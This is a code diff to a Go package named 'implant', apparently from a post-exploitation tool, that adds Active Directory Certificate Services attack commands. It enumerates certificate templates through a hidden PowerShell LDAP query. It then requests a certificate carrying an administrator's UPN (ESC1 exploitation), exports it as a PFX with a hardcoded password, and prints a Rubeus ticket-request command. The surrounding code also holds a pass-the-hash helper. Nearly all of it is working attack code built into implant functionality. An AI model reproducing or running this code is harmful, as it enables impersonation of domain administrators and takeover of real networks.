@@ -2,6 +2,7 @@ package implant
 
 import (
 	"fmt"
+	"os"
 	"runtime"
 	"strings"
 )
@@ -132,6 +133,18 @@ func GetADCommands() map[string]ADCommand {
 			Name:        "ad-pass-the-hash",
 			Description: "Pass-the-Hash authentication",
 			Executor:    adPassTheHash,
+		},
+
+		// ── ADCS ──
+		"ad-adcs-enum": {
+			Name:        "ad-adcs-enum",
+			Description: "Enumerate ADCS certificate templates for ESC1-ESC8 misconfigurations",
+			Executor:    adADCSEnum,
+		},
+		"ad-adcs-request": {
+			Name:        "ad-adcs-request",
+			Description: "Request a certificate with alternate SAN (ESC1 exploitation). Args: template-name target-upn",
+			Executor:    adADCSRequest,
 		},
 	}
 }
@@ -340,6 +353,114 @@ func adPassTheHash(args []string) ([]byte, error) {
 		cmd = strings.Join(args[3:], " ")
 	}
 	return []byte(fmt.Sprintf("PtH on Linux: impacket-psexec -hashes '%s' '%s@%s' '%s'", args[2], args[1], args[0], cmd)), nil
+}
+
+// ── ADCS Attacks ──
+
+// adADCSEnum enumerates ADCS certificate templates looking for ESC misconfigurations.
+func adADCSEnum(args []string) ([]byte, error) {
+	if runtime.GOOS == "windows" {
+		// Query LDAP for certificate templates with dangerous flags.
+		// msPKI-Certificate-Name-Flag bit 1 = ENROLLEE_SUPPLIES_SUBJECT (ESC1)
+		// msPKI-Enrollment-Flag bit 1 = CT_FLAG_INCLUDE_SYMMETRIC_ALGORITHMS (ESC2)
+		cmds := []string{
+			// List all CAs
+			`certutil -config - -ping 2>&1 || certutil -CA 2>&1`,
+			// Enumerate templates with PowerShell LDAP query
+			`powershell -NoP -W Hidden -C "` +
+				`$root = [ADSI]'LDAP://RootDSE';` +
+				`$conf = $root.configurationNamingContext;` +
+				`$searcher = New-Object DirectoryServices.DirectorySearcher([ADSI]\"LDAP://CN=Certificate Templates,CN=Public Key Services,CN=Services,$conf\");` +
+				`$searcher.Filter = '(objectClass=pKICertificateTemplate)';` +
+				`$searcher.PropertiesToLoad.AddRange(@('cn','msPKI-Certificate-Name-Flag','msPKI-Enrollment-Flag','pKIExtendedKeyUsage','nTSecurityDescriptor'));` +
+				`$templates = $searcher.FindAll();` +
+				`foreach($t in $templates){` +
+				`  $nameFlag = [int]$t.Properties['msPKI-Certificate-Name-Flag'][0];` +
+				`  $enrollFlag = [int]$t.Properties['msPKI-Enrollment-Flag'][0];` +
+				`  $esc1 = ($nameFlag -band 1) -ne 0;` +
+				`  $eku = $t.Properties['pKIExtendedKeyUsage'];` +
+				`  Write-Output \"Template: $($t.Properties['cn'][0])  NameFlag: $nameFlag  EnrollFlag: $enrollFlag  ESC1: $esc1  EKU: $eku\"` +
+				`}"`,
+		}
+		var out []byte
+		for _, cmd := range cmds {
+			result, _ := ExecuteShell([]string{cmd})
+			out = append(out, result...)
+			out = append(out, '\n')
+		}
+		return out, nil
+	}
+	// Linux: use ldapsearch if available
+	cmd := `ldapsearch -H ldap:// -x -b "CN=Certificate Templates,CN=Public Key Services,CN=Services,$(ldapsearch -H ldap:// -x -s base namingContexts 2>/dev/null | grep configurationNamingContext | awk '{print $2}')" "(objectClass=pKICertificateTemplate)" cn msPKI-Certificate-Name-Flag 2>/dev/null || echo "ldapsearch not available or not domain-joined"`
+	return ExecuteShell([]string{cmd})
+}
+
+// adADCSRequest requests a certificate with an alternate UPN (ESC1 exploitation).
+// args[0]: certificate template name
+// args[1]: target UPN (e.g., "administrator@domain.com")
+func adADCSRequest(args []string) ([]byte, error) {
+	if len(args) < 2 {
+		return []byte("Usage: ad-adcs-request <template-name> <target-upn>\nExample: ad-adcs-request UserAuthentication administrator@domain.com"), nil
+	}
+	template := args[0]
+	targetUPN := args[1]
+
+	if runtime.GOOS == "windows" {
+		// Use certreq to request cert with SAN override.
+		// This requires the template to have CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT (ESC1).
+		infContent := fmt.Sprintf(`[NewRequest]
+Subject = "CN=phantom"
+KeySpec = 1
+KeyLength = 2048
+Exportable = TRUE
+MachineKeySet = FALSE
+SMIME = False
+PrivateKeyArchive = FALSE
+UserProtected = FALSE
+UseExistingKeySet = FALSE
+ProviderName = "Microsoft RSA SChannel Cryptographic Provider"
+ProviderType = 12
+RequestType = CMC
+KeyUsage = 0xa0
+[RequestAttributes]
+CertificateTemplate = %s
+SAN = "upn=%s"
+`, template, targetUPN)
+
+		tmpInf := os.TempDir() + `\phantom_cert.inf`
+		tmpReq := os.TempDir() + `\phantom_cert.req`
+		tmpCer := os.TempDir() + `\phantom_cert.cer`
+		tmpPfx := os.TempDir() + `\phantom_cert.pfx`
+
+		if err := os.WriteFile(tmpInf, []byte(infContent), 0600); err != nil {
+			return nil, fmt.Errorf("write INF: %w", err)
+		}
+
+		cmds := []string{
+			fmt.Sprintf(`certreq -new "%s" "%s"`, tmpInf, tmpReq),
+			fmt.Sprintf(`certreq -submit -config - "%s" "%s"`, tmpReq, tmpCer),
+			fmt.Sprintf(`certreq -accept "%s"`, tmpCer),
+			fmt.Sprintf(`certutil -exportPFX -p phantom123 My phantom "%s"`, tmpPfx),
+		}
+
+		var out []byte
+		for _, cmd := range cmds {
+			result, _ := ExecuteShell([]string{cmd})
+			out = append(out, result...)
+			out = append(out, '\n')
+			// If cert file exists, we succeeded
+			if _, err := os.Stat(tmpPfx); err == nil {
+				out = append(out, []byte(fmt.Sprintf("[+] Certificate exported to: %s (password: phantom123)\n[+] Use with Rubeus: Rubeus.exe asktgt /user:administrator /certificate:%s /password:phantom123\n", tmpPfx, tmpPfx))...)
+				break
+			}
+		}
+		// Cleanup temp files except PFX
+		os.Remove(tmpInf)
+		os.Remove(tmpReq)
+		os.Remove(tmpCer)
+		return out, nil
+	}
+	return []byte("ADCS certificate request requires Windows (certreq). On Linux, use Certipy: certipy req -u user@domain -p pass -ca CA-NAME -template " + template + " -upn " + targetUPN), nil
 }
 
 // ── Linux LDAP Helper ──
